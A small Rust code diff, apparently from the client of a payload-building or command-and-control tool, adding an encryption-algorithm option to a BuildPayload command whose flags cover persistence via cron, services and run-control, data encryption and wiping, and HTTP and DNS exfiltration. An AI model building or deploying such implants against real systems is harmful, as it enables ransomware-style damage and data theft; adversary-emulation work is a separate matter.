@@ -126,7 +126,7 @@ async fn process_command(cmd: Command, client: Arc<RealClient>, tx: mpsc::Sender
         Command::BuildPayload {
             url, port, debug,
             persistence, persist_runcontrol, persist_service, persist_cron,
-            impact, impact_encrypt, impact_wipe,
+            impact, impact_encrypt, encryption_algo, impact_wipe,
             exfil, exfil_http, exfil_dns
         } => {
             let c = client.clone();
@@ -144,6 +144,7 @@ async fn process_command(cmd: Command, client: Arc<RealClient>, tx: mpsc::Sender
                 persist_cron,
                 enable_impact: impact,
                 impact_encrypt,
+                encryption_algo,
                 impact_wipe,
                 enable_exfil: exfil,
                 exfil_http,
